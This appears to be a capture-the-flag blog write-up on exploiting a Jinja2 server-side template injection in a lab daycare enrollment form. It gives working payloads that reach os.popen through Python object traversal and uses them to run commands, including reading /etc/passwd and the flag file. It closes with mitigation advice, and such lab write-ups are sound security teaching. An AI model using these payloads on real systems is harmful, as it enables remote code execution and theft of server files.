---
title: "Jinja2 SSTI to Remote Code Execution | SunnySide"
date: 2026-05-08 03:10:00 +0530
categories: [Web Security, SSTI]
tags: [ssti, jinja2, flask, python, rce, server-side-template-injection, command-execution, webversepro]
platform: WebVerse
author: Shivansh Sharma
image:
  path: /assets/images/posts/sunnyside-ssti.webp
  alt: Jinja2 SSTI leading to remote code execution in SunnySide daycare portal
---

## Overview

SunnySide was a daycare enrollment platform that allowed parents to submit inquiries for childcare programs through an online registration form.

During testing, the `/enroll` endpoint was found to reflect user-controlled input directly into a server-side template. Further investigation confirmed the backend was using the Jinja2 template engine without proper sanitization.

By exploiting the Server-Side Template Injection (SSTI) vulnerability, it was possible to achieve arbitrary command execution on the server and ultimately retrieve the flag from the filesystem.

---

## Objective

Exploit the SSTI vulnerability in the enrollment form to gain remote code execution and retrieve the flag from the server.

---

## Reconnaissance

While browsing the application functionality, the following endpoint was identified:

```text
/enroll
```

The endpoint accepted user input through a daycare inquiry form.

---

## Initial SSTI Testing

A basic SSTI payload was injected into the `name` parameter.

### Payload

```python
{% raw %}
{{7*7}}
{% endraw %}
```

### Request

```http
POST /enroll HTTP/2
Host: 424efb99-4065-sunnyside-14172.events.webverselabs-pro.com
Content-Type: application/x-www-form-urlencoded

name=%7B%7B7*7%7D%7D&parent_email=kelvin@kel.com&child_age=under-18m&program=Infants&preferred_start=2026-05-07&message=
```

### Response

```text
Thank you, 49!
```

The payload was evaluated server-side, confirming SSTI.

---

## Template Engine Identification

To identify the template engine, the following payload was used.

### Payload

```python
{% raw %}
{{7*'7'}}
{% endraw %}
```

### Response

```text
Thank you, 7777777!
```

This behavior is characteristic of Jinja2.

- Twig returns: `49`
- Jinja2 returns: `7777777`

The backend was therefore confirmed to be using Jinja2.

---

## Accessing Flask Configuration

Next, Flask configuration values were accessed through the template context.

### Payload

```python
{% raw %}
{{config}}
{% endraw %}
```

### Response

```python
Thank you, <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None ...}>!
```

This confirmed:

- Flask backend
- Jinja2 rendering
- Direct access to Python objects within the template context

---

## Achieving Remote Code Execution

Using Jinja2 object traversal, arbitrary Python imports were possible.

### Payload

```python
{% raw %}
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
{% endraw %}
```

### Response

```text
Thank you, sunnyside !
```

This confirmed successful command execution on the underlying server.

---

## User Enumeration

The `id` command was executed to enumerate the running application user.

### Payload

```python
{% raw %}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{% endraw %}
```

### Response

```text
Thank you, uid=1100(sunnyside) gid=1100(sunnyside) groups=1100(sunnyside) !
```

The application was running as the `sunnyside` user.

---

## Reading System Files

The vulnerability allowed arbitrary file access from the underlying operating system.

### Payload

```python
{% raw %}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}
{% endraw %}
```

### Response

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
sunnyside:x:1100:1100::/home/sunnyside:/bin/bash
```

This verified unrestricted command execution and filesystem access.

---

## Locating the Flag

The root directory was enumerated to identify sensitive files.

### Payload

```python
{% raw %}
{{request.application.__globals__.__builtins__.__import__('os').popen('ls /').read()}}
{% endraw %}
```

### Response

```text
Thank you, bin boot dev entrypoint.sh etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var !
```

The presence of `flag.txt` in the root directory was identified.

---

## Retrieving the Flag

The flag file was read directly from the filesystem.

### Payload

```python
{% raw %}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read()}}
{% endraw %}
```

### Response

```text
WEBVERSE{....}
```

---

## Proof of Exploitation

The SSTI vulnerability resulted in:

- Server-side template execution
- Arbitrary Python execution
- Operating system command execution
- Arbitrary file read access
- Full remote code execution (RCE)

---

## Root Cause

The application rendered unsanitized user input directly within a Jinja2 template context.

Because Jinja2 templates support Python object traversal, attackers could escape the intended template scope and access dangerous Python internals such as:

- `__globals__`
- `__builtins__`
- `__import__`

This ultimately allowed arbitrary command execution through Python's `os` module.

---

## Impact

An attacker could:

- Execute arbitrary system commands
- Read sensitive files
- Access application secrets
- Enumerate internal infrastructure
- Potentially achieve container or host compromise
- Fully compromise the backend server

This vulnerability represents critical severity due to direct remote code execution.

---

## Mitigation

Developers should:

- Never render user-controlled input directly into templates
- Avoid using `render_template_string()` with user input
- Use safe rendering functions
- Enable template sandboxing
- Avoid exposing dangerous Python objects to templates
- Apply strict input validation
- Use allowlisted template variables only
- Run applications with minimal system privileges

Additionally:

- Sensitive files should not be stored in predictable locations
- Containers should use hardened runtime configurations
- Dangerous debug functionality should be disabled in production

---

## Real-World Insight

Jinja2 SSTI vulnerabilities are among the most dangerous web application issues because they often lead directly to remote code execution.

Flask applications are especially vulnerable when developers dynamically build templates using functions such as:

```python
render_template_string()
```

Without strict separation between template logic and user-controlled data, attackers can abuse Python introspection features to fully compromise the backend environment.